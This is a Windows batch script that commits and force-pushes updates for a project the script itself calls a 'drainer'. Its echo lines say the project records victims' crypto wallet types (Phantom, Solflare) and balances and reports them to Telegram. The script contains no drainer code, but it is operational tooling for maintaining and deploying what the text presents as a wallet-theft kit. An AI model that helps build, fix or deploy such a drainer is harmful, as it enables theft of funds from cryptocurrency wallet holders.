@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Fixing wallet type display in Telegram...
echo.
echo Changes made:
echo - Removed hardcoded "Detected by Drainer" wallet type from drainer
echo - Updated Telegram logging to hide meaningless wallet types
echo - Frontend will show actual wallet type (Phantom, Solflare, etc.)
echo - Drainer will show balance without wallet type (already logged by frontend)
echo.
echo Committing wallet type display fixes...
git add .
git commit -m "FIX: Wallet type display in Telegram - show actual wallet types only"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing to Emi-lokan repository...
git push origin %CURRENT_BRANCH%
echo.
echo Pushing to Lombard repository...
git remote add lombard https://github.com/SacredPath/Lombard.git
git fetch lombard
git push lombard %CURRENT_BRANCH%:main --force
git remote remove lombard
echo.
echo Done! Wallet type display fixed in both repositories.
echo.
echo Summary:
echo - Telegram will now show actual wallet types (Phantom, Solflare, etc.)
echo - No more "Detected by Drainer" in wallet type field
echo - Meaningless wallet types are hidden from display
echo - Both repositories updated with latest fixes
pause
